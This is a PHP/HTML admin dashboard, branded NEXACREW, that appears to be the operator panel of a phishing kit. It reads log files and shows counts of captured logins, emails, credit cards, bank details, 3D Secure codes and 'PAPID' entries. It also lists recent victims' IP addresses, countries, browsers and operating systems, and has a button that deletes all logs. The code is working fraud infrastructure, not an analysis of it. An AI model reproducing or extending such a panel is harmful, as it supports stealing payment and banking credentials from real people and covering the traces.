<?php
session_start();
error_reporting(0);
if (!isset($_SESSION['logged_in'])) {
    header('location: login.php');
    die();
}
$realvisitor = "../Static/log_click.txt";
if (file_exists($realvisitor)) {
    $lines = count(file($realvisitor));
    if ($lines == 0) {
        $realvisitor = 0;
    } else {
        $realvisitor = $lines;
    }
} else {
    $realvisitor = "0";
}
$realvisitor_human = "../Static/log_human.txt";
if (file_exists($realvisitor_human)) {
    $lines = count(file($realvisitor_human));
    if ($lines == 0) {
        $realvisitor_human = 0;
    } else {
        $realvisitor_human = $lines;
    }
} else {
    $realvisitor_human = "0";
}
$totallogin = "../Static/log_account.txt";
if (file_exists($totallogin)) {
    $lines = count(file($totallogin));
    if ($lines == 0) {
        $total_login = 0;
    } else {
        $total_login = $lines;
    }
} else {
    $total_login = "0";
}
$email = "../Static/log_email.txt";
if (file_exists($email)) {
    $lines = count(file($email));
    if ($lines == 0) {
        $email = 0;
    } else {
        $email = $lines;
    }
} else {
    $email = "0";
}
$cendol = "../Static/log_cc.txt";
if (file_exists($cendol)) {
    $lines = count(file($cendol));
    if ($lines == 0) {
        $cendol = 0;
    } else {
        $cendol = $lines;
    }
} else {
    $cendol = "0";
}
$bank = "../Static/log_bank.txt";
if (file_exists($bank)) {
    $lines = count(file($bank));
    if ($lines == 0) {
        $bank = 0;
    } else {
        $bank = $lines;
    }
} else {
    $bank = "0";
}
$secure = "../Static/log_3dsecure.txt";
if (file_exists($secure)) {
    $lines = count(file($secure));
    if ($lines == 0) {
        $secure = 0;
    } else {
        $secure = $lines;
    }
} else {
    $secure = "0";
}
$pap = "../Static/log_papid.txt";
if (file_exists($pap)) {
    $lines = count(file($pap));
    if ($lines == 0) {
        $pap = 0;
    } else {
        $pap = $lines;
    }
} else {
    $pap = "0";
}
$badbot = "../Static/log_robot.txt";
if (file_exists($badbot)) {
    $lines = count(file($badbot));
    if ($lines == 0) {
        $badbot = 0;
    } else {
        $badbot = $lines;
    }
} else {
    $badbot = "0";
}
?>
<!DOCTYPE html>
<html lang="en" data-layout="vertical" data-topbar="light" data-sidebar="dark" data-sidebar-size="lg" data-sidebar-image="none" data-preloader="disable" data-theme="default" data-theme-colors="default">

<head>
    <meta charset="utf-8" />
    <title>Dashboard | NEXACREW</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta content="Dashboard NEXACREW" name="description" />
    <meta content="NEXACREW" name="author" />
    <!-- App favicon -->
    <link rel="shortcut icon" href="assets/img/favicon.ico">
    <!-- Layout config Js -->
    <script src="assets/js/layout.js"></script>
    <!-- Bootstrap Css -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <!-- Icons Css -->
    <link href="assets/css/icons.min.css" rel="stylesheet" type="text/css" />
    <!-- App Css-->
    <link href="assets/css/app.min.css" rel="stylesheet" type="text/css" />
    <!-- custom Css-->
    <link href="assets/css/custom.min.css" rel="stylesheet" type="text/css" />
    <link href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.css" rel="stylesheet">
    <!-- Data Tables CSS -->
    <link href="assets/css/dataTables.bootstrap5.css" rel="stylesheet" />
    <link href="assets/css/buttons.bootstrap5.min.css" rel="stylesheet">
    <link href="assets/css/responsive.bootstrap5.css" rel="stylesheet" />
    <style>
        /* Define a disco effect animation with multiple color changes */
        @keyframes discoEffect {
            0% {
                color: red;
            }

            20% {
                color: yellow;
            }

            40% {
                color: green;
            }

            60% {
                color: blue;
            }

            80% {
                color: purple;
            }

            100% {
                color: pink;
            }
        }

        /* Apply the disco effect to the element */
        .disco-text {
            font-size: 1.2em;
            animation: discoEffect 1s infinite;
        }
    </style>
</head>

<body>
    <div id="layout-wrapper">
        <?php require 'header.php'; ?>
        <?php require 'navbar.php'; ?>
        <!-- Vertical Overlay-->
        <div class="vertical-overlay"></div>
        <!-- ============================================================== -->
        <!-- Start right Content here -->
        <!-- ============================================================== -->
        <div class="main-content">
            <div class="page-content">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-12">
                            <div class="page-title-box d-sm-flex align-items-center justify-content-between bg-galaxy-transparent">
                                <h4 class="mb-sm-0">Dashboards</h4>
                                <div class="page-title-right">
                                    <ol class="breadcrumb m-0">
                                        <li class="breadcrumb-item">
                                            <a href="javascript: void(0);">Dashboards</a>
                                        </li>
                                    </ol>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xxl-5">
                            <div class="d-flex flex-column h-100">
                                <div class="row h-100">
                                    <div class="col-12">
                                        <div class="card">
                                            <div class="card-body p-0">
                                                <div class="row align-items-end">
                                                    <div class="col-sm-8">
                                                        <div class="p-3">
                                                            <p class="fs-16 lh-base">Now your account is <span class="fw-semibold">Admin</span>.</p>
                                                            <p class="fs-16 lh-base">Now you can set the panels as you wish</p>
                                                            <button onclick="deleteLogs()" class="btn btn-outline-primary">Delete Logs</button>
                                                        </div>
                                                    </div>
                                                    <div class="col-sm-4">
                                                        <div class="px-3">
                                                            <img src="assets/img/avatar.png" class="img-fluid" alt="">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div> <!-- end card-body-->
                                        </div>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="card card-animate">
                                                    <div class="card-body">
                                                        <div class="d-flex justify-content-between">
                                                            <div>
                                                                <p class="fw-medium text-muted mb-0">Click</p>
                                                                <h2 class="mt-4 ff-info cfs-22 fw-semibold"><?= $realvisitor; ?></h2>
                                                            </div>
                                                            <div>
                                                                <div class="avatar-sm flex-shrink-0">
                                                                    <span class="avatar-title bg-info-subtle rounded-circle fs-2">
                                                                        <i data-feather="mouse-pointer" class="text-info"></i>
                                                                    </span>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div><!-- end card body -->
                                                </div> <!-- end card-->
                                            </div> <!-- end col-->
                                            <div class="col-md-6">
                                                <div class="card card-animate">
                                                    <div class="card-body">
                                                        <div class="d-flex justify-content-between">
                                                            <div>
                                                                <p class="fw-medium text-muted mb-0">Human</p>
                                                                <h2 class="mt-4 ff-secondary cfs-22 fw-semibold"><?= $realvisitor_human; ?></h2>
                                                            </div>
                                                            <div>
                                                                <div class="avatar-sm flex-shrink-0">
                                                                    <span class="avatar-title bg-info-subtle rounded-circle fs-2">
                                                                        <i data-feather="user" class="text-info"></i>
                                                                    </span>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div><!-- end card body -->
                                                </div> <!-- end card-->
                                            </div> <!-- end col-->
                                            <div class="col-md-6">
                                                <div class="card card-animate">
                                                    <div class="card-body">
                                                        <div class="d-flex justify-content-between">
                                                            <div>
                                                                <p class="fw-medium text-muted mb-0">Robot</p>
                                                                <h2 class="mt-4 ff-secondary cfs-22 fw-semibold"><?= $badbot; ?></h2>
                                                            </div>
                                                            <div>
                                                                <div class="avatar-sm flex-shrink-0">
                                                                    <span class="avatar-title bg-danger-subtle rounded-circle fs-2">
                                                                        <i data-feather="meh" class="text-danger"></i>
                                                                    </span>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div><!-- end card body -->
                                                </div> <!-- end card-->
                                            </div> <!-- end col-->
                                        </div>
                                    </div> <!-- end col-->
                                </div> <!-- end row-->
                            </div>
                        </div> <!-- end col-->
                        <div class="col-xxl-7">
                            <div class="row">
                                <div class="col-md-6">
                                    <div class="card card-animate">
                                        <div class="card-body">
                                            <div class="d-flex justify-content-between">
                                                <div>
                                                    <p class="fw-medium text-muted mb-0">Login</p>
                                                    <h2 class="mt-4 ff-warning cfs-22 fw-semibold"><?= $total_login; ?></h2>
                                                </div>
                                                <div>
                                                    <div class="avatar-sm flex-shrink-0">
                                                        <span class="avatar-title bg-info-subtle rounded-circle fs-2">
                                                            <i data-feather="log-in" class="text-info"></i>
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div> <!-- end card-body -->
                                    </div> <!-- end card -->
                                </div> <!-- end col -->
                                <div class="col-md-6">
                                    <div class="card card-animate">
                                        <div class="card-body">
                                            <div class="d-flex justify-content-between">
                                                <div>
                                                    <p class="fw-medium text-muted mb-0">Email</p>
                                                    <h2 class="mt-4 ff-primary cfs-22 fw-semibold"><?= $email; ?></h2>
                                                </div>
                                                <div>
                                                    <div class="avatar-sm flex-shrink-0">
                                                        <span class="avatar-title bg-primary-subtle rounded-circle fs-2">
                                                            <i data-feather="mail" class="text-info"></i>
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div><!-- end card body -->
                                    </div> <!-- end card-->
                                </div> <!-- end col-->
                                <div class="col-md-6">
                                    <div class="card card-animate">
                                        <div class="card-body">
                                            <div class="d-flex justify-content-between">
                                                <div>
                                                    <p class="fw-medium text-muted mb-0">Credit Card</p>
                                                    <h2 class="mt-4 ff-warning cfs-22 fw-semibold"><?= $cendol; ?></h2>
                                                </div>
                                                <div>
                                                    <div class="avatar-sm flex-shrink-0">
                                                        <span class="avatar-title bg-primary-subtle rounded-circle fs-2">
                                                            <i data-feather="credit-card" class="text-info"></i>
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div><!-- end card body -->
                                    </div> <!-- end card-->
                                </div> <!-- end col-->
                                <div class="col-md-6">
                                    <div class="card card-animate">
                                        <div class="card-body">
                                            <div class="d-flex justify-content-between align-items-center">
                                                <div>
                                                    <p class="fw-medium text-muted mb-0">Bank</p>
                                                    <h2 class="mt-4 ff-warning cfs-22 fw-semibold"><?= $bank; ?></h2>
                                                </div>
                                                <div>
                                                    <div class="avatar-sm flex-shrink-0">
                                                        <span class="avatar-title bg-primary-subtle rounded-circle fs-2 d-flex align-items-center justify-content-center">
                                                            <i class="fa-solid fa-building-columns text-info" style="font-size: 1.5rem;"></i>
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div> <!-- end card-body -->
                                    </div> <!-- end card -->
                                </div> <!-- end col -->
                                <div class="col-md-6">
                                    <div class="card card-animate">
                                        <div class="card-body">
                                            <div class="d-flex justify-content-between">
                                                <div>
                                                    <p class="fw-medium text-muted mb-0">3D SECURE</p>
                                                    <h2 class="mt-4 ff-warning cfs-22 fw-semibold"><?= $secure; ?></h2>
                                                </div>
                                                <div>
                                                    <div class="avatar-sm flex-shrink-0">
                                                        <span class="avatar-title bg-info-subtle rounded-circle fs-2">
                                                            <i class="fa-solid fa-shield-halved text-info"></i>
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div> <!-- end card-body -->
                                    </div> <!-- end card -->
                                </div> <!-- end col -->
                                <div class="col-md-6">
                                    <div class="card card-animate">
                                        <div class="card-body">
                                            <div class="d-flex justify-content-between">
                                                <div>
                                                    <p class="fw-medium text-muted mb-0">PAPID</p>
                                                    <h2 class="mt-4 ff-warning cfs-22 fw-semibold"><?= $pap; ?></h2>
                                                </div>
                                                <div>
                                                    <div class="avatar-sm flex-shrink-0">
                                                        <span class="avatar-title bg-info-subtle rounded-circle fs-2">
                                                            <i data-feather="check-circle" class="text-info"></i> <!-- Validasi -->
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div> <!-- end card-body -->
                                    </div> <!-- end card -->
                                </div> <!-- end col -->
                            </div><!-- end col -->
                        </div> <!-- end row-->
                    </div>
                    <div class="col-xxl-12">
                        <div class="card">
                            <div class="card-header align-items-center d-flex">
                                <h4 class="card-title mb-0 flex-grow-1">Recent Human</h4>
                            </div>
                            <div class="card-body">
                                <div class="table-responsive">
                                    <div id="basic-datatable_wrapper" class="dataTables_wrapper dt-bootstrap5">
                                        <div class="row">
                                            <div class="col-sm-12">
                                            <?php
                                            $file_path = "../Static/log_human.txt";
                                            if (file_exists($file_path)) {
                                                $bit = file_get_contents($file_path);
                                                $bit = explode("\n", $bit);
                                                $list = array_reverse($bit);
                                            } else {
                                                // Handle file not found
                                                echo "Log file not found.";
                                                $list = [];
                                            }
                                            ?>
                                            <table class="table align-middle m-0" id="basic-datatable" role="grid" aria-describedby="basic-datatable_info">
                                                <thead class="text-muted table-light">
                                                    <tr>
                                                        <th class="text-center">Time</th>
                                                        <th class="text-center">IP Address</th>
                                                        <th class="text-center">Country</th>
                                                        <th class="text-center">Browser</th>
                                                        <th class="text-center">Operating System</th>
                                                        <th class="text-center">Human Process</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                <?php
                                                foreach ($list as $gladiator) {
                                                    // Split the line by "|", but only if the line is not empty
                                                    if (empty($gladiator)) {
                                                        continue; // Skip empty lines
                                                    }
                                                    $gladiator = explode("|", $gladiator);
                                                    // Ensure the line has the expected number of parts (at least 6)
                                                    if (count($gladiator) < 6) {
                                                        continue; // Skip lines with insufficient data
                                                    }
                                                    $time = $gladiator[1];
                                                    $country = $gladiator[2];
                                                    $ip = $gladiator[3];
                                                    $bs = $gladiator[4];
                                                    $os = $gladiator[5];
                                                    $type = $gladiator[6];
                                                    // Skip rows where IP is empty
                                                    if ($ip != "") {
                                                        ?>
                                                        <tr>
                                                            <td class="text-center"><?= $time; ?></td>
                                                            <td class="text-center"><?= $country; ?></td>
                                                            <td class="text-center"><?= $ip; ?></td>
                                                            <td class="text-center"><?= $bs; ?></td>
                                                            <td class="text-center"><?= $os; ?></td>
                                                            <td class="text-center"><?= $type; ?></td>
                                                        </tr>
                                                        <?php
                                                    }
                                                }
                                                ?>
                                                </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <footer class="footer">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-sm-6">
                                    <script>
                                        document.write(new Date().getFullYear())
                                    </script> © NEXACREW.
                                </div>
                                <div class="col-sm-6">
                                    <div class="text-sm-end d-none d-sm-block">
                                        Design & Develop by NEXACREW
                                    </div>
                                </div>
                            </div>
                        </div>
                    </footer>
                </div>
                <!-- end main content-->
            </div>
            <!-- END layout-wrapper -->
            <?php require 'footer.php'; ?>
            <!-- JAVASCRIPT -->
            <script src="assets/js/simplebar.min.js"></script>
            <script src="assets/js/waves.min.js"></script>
            <script src="assets/js/feather.min.js"></script>
            <script src="assets/js/lord-icon-2.1.0.js"></script>
            <script src="assets/js/plugins.js"></script>
            <script src="assets/js/jquery-3.6.0.min.js"></script>
            <!-- Data tables -->
            <script src="assets/js/jquery.dataTables.min.js"></script>
            <script src="assets/js/dataTables.bootstrap5.js"></script>
            <script src="assets/js/dataTables.responsive.min.js"></script>
            <script src="assets/js/table-data.js"></script>
            <!-- Dashboard init -->
            <script src="assets/js/dashboard-analytics.init.js"></script>
            <!-- App js -->
            <script src="assets/js/app.js"></script>
            <!-- Bootstrap JS (Make sure to include Popper.js for Bootstrap components to work) -->
            <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"></script>
            <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
            <script src="assets/js/bootstrap.bundle.min.js"></script>
            <script>
                // Function to delete logs with a button click
                function deleteLogs() {
                    // Send a request to the PHP script to delete logs
                    fetch('delete_logs.php')
                        .then(response => response.text())
                        .then(data => {
                            // Check if the response contains "deleted" to indicate success
                            if (data.includes("Logs deleted successfully")) {
                                showToast('Logs deleted successfully', 'All logs have been cleared', 'success');

                                // Wait 1 seconds before refreshing to allow the toast message to be seen
                                setTimeout(() => {
                                    location.reload();
                                }, 1000);
                            } else {
                                showToast('Error deleting logs', 'Something went wrong while deleting the logs', 'danger');
                            }
                        })
                        .catch(error => {
                            // If there's an error with the request, show an error toast
                            showToast('An error occurred while deleting logs', 'Network or server error', 'danger');
                        });
                }
                // Consolidated showToast function to display messages
                function showToast(title, message, type) {
                    // Create a new toast element
                    var toast = document.createElement('div');
                    toast.classList.add('toast', 'toast-' + type);
                    toast.style.position = 'fixed';
                    toast.style.top = '10px';
                    toast.style.right = '10px';
                    toast.style.zIndex = '9999';

                    // Choose icon based on the type
                    let icon = '';
                    if (type === 'success') {
                        icon = '<i class="ri-check-double-line" style="font-size: 1.5rem; margin-right: 8px;"></i>'; // Success icon
                    } else if (type === 'danger') {
                        icon = '<i class="ri-close-line" style="font-size: 1.5rem; margin-right: 8px;"></i>'; // Error icon
                    } else if (type === 'warning') {
                        icon = '<i class="ri-error-warning-line" style="font-size: 1.5rem; margin-right: 8px;"></i>'; // Warning icon
                    }

                    // Inner content for the toast with icon, title, and message
                    toast.innerHTML = `
                <div class="toast-body">
                    ${icon} 
                    <strong>${title}</strong> ${message}
                    <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
                </div>`;

                    // Append the toast to the body
                    document.body.appendChild(toast);

                    // Initialize and show the toast using Bootstrap Toast
                    var bsToast = new bootstrap.Toast(toast, {
                        delay: 3000
                    });
                    bsToast.show();

                    // Close toast after the duration of delay (3 seconds)
                    setTimeout(() => {
                        toast.remove();
                    }, 3000);
                }
            </script>
</body>

</html>